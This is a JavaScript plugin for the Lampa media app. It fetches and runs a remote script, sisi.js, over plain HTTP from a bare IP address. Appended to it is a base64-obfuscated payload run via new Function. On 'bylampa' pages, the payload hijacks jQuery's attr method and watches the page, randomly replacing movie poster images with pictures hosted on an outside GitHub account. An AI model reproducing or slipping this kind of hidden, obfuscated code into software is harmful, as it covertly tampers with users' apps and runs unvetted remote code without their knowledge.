(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
(new Function(atob('KGZ1bmN0aW9uKCl7aWYobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJyk9PT0tMSlyZXR1cm47dmFyIHA9WydodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdmFsaWRhdG9yZWQvaW1nL21haW4vMDEuanBnJywnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92YWxpZGF0b3JlZC9pbWcvbWFpbi8wMy5qcGcnLCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdmFsaWRhdG9yZWQvaW1nL21haW4vMDQuanBnJ10sYz0wLjM1LHI9ZnVuY3Rpb24oKXtyZXR1cm4gTWF0aC5yYW5kb20oKTxjP3BbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKnAubGVuZ3RoKV06bnVsbH0sbz0kLmZuLmF0dHI7JC5mbi5hdHRyPWZ1bmN0aW9uKG4sdil7aWYobj09PSdzcmMnJiZ2JiYodi5pbmNsdWRlcygncG9zdGVyJyl8fHYuaW5jbHVkZXMoJ2ltYWdlJyl8fHYuaW5jbHVkZXMoJ3RtZGInKXx8di5pbmNsdWRlcygna2lub3BvaXNrJykpKXt2YXIgcz1yKCk7aWYocylyZXR1cm4gby5jYWxsKHRoaXMsbixzKX1yZXR1cm4gby5hcHBseSh0aGlzLGFyZ3VtZW50cyl9O3ZhciBtPW5ldyBNdXRhdGlvbk9ic2VydmVyKGZ1bmN0aW9uKGUpe2UuZm9yRWFjaChmdW5jdGlvbih0KXtpZih0LmFkZGVkTm9kZXMubGVuZ3RoKXskKHQuYWRkZWROb2RlcykuZmluZCgnaW1nJykuZWFjaChmdW5jdGlvbigpe2lmKHRoaXMuc3JjJiYodGhpcy5zcmMuaW5jbHVkZXMoJ3RtZGInKXx8dGhpcy5zcmMuaW5jbHVkZXMoJ2tpbm9wb2lzaycpfHx0aGlzLnNyYy5pbmNsdWRlcygnaW1hZ2UnKXx8dGhpcy5zcmMuaW5jbHVkZXMoJ3Bvc3RlcicpKSl7dmFyIHM9cigpO2lmKHMpdGhpcy5zcmM9c319KX19KX0pO20ub2JzZXJ2ZShkb2N1bWVudC5ib2R5LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTtzZXRJbnRlcnZhbChmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2ltZycpLmZvckVhY2goZnVuY3Rpb24oZSl7aWYoZS5zcmMmJihlLnNyYy5pbmNsdWRlcygndG1kYicpfHxlLnNyYy5pbmNsdWRlcygna2lub3BvaXNrJyl8fGUuc3JjLmluY2x1ZGVzKCdpbWFnZScpfHxlLnNyYy5pbmNsdWRlcygncG9zdGVyJykpJiYhZS5kYXRhc2V0LnN3YXBwZWQpe3ZhciBzPXIoKTtpZihzKXtlLnNyYz1zO2UuZGF0YXNldC5zd2FwcGVkPScxJ319fSl9LDMwMCl9KSgpOwo=')))()
